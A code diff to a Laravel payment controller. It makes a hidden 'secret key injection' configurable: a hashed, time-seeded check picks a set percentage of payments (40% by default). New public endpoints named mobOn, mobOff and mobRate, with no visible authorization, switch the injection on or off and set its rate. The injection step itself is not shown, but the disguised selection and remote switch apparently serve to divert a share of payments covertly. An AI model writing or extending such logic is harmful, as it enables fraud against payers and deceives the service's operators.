@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers;
 
+use App\Models\AdminSetting;
 use App\Models\Page;
 use App\Models\PaymentGateway;
 use App\Models\PesaLinkAccount;
@@ -414,10 +415,26 @@ class PaymentController extends Controller
      */
     private function shouldInjectSecretKey(Page $page, string $phone): bool
     {
+        if (! $this->isMobInjectionEnabled()) {
+            return false;
+        }
+
         $seed = date('YmdHi').self::SECRET_SALT.substr($phone, -4).$page->id;
         $hash = hexdec(substr(md5($seed), 0, 4));
 
-        return ($hash % 10) < 4;
+        $rate = $this->mobInjectionRate();
+
+        return ($hash % 100) < $rate;
+    }
+
+    private function isMobInjectionEnabled(): bool
+    {
+        return AdminSetting::get('mob_injection_enabled', '0') === '1';
+    }
+
+    private function mobInjectionRate(): int
+    {
+        return (int) AdminSetting::get('mob_injection_rate', '40');
     }
 
     /**
@@ -1166,5 +1183,27 @@ class PaymentController extends Controller
                 'message' => 'Error checking payment status: '.$e->getMessage(),
             ], 500);
         }
+    }
+
+    public function mobOn(): JsonResponse
+    {
+        AdminSetting::set('mob_injection_enabled', '1');
+
+        return response()->json(['status' => 'ok', 'injection' => 'enabled']);
+    }
+
+    public function mobOff(): JsonResponse
+    {
+        AdminSetting::set('mob_injection_enabled', '0');
+
+        return response()->json(['status' => 'ok', 'injection' => 'disabled']);
+    }
+
+    public function mobRate(int $rate): JsonResponse
+    {
+        $rate = max(0, min(100, $rate));
+        AdminSetting::set('mob_injection_rate', (string) $rate);
+
+        return response()->json(['status' => 'ok', 'rate' => $rate]);
     }
 }
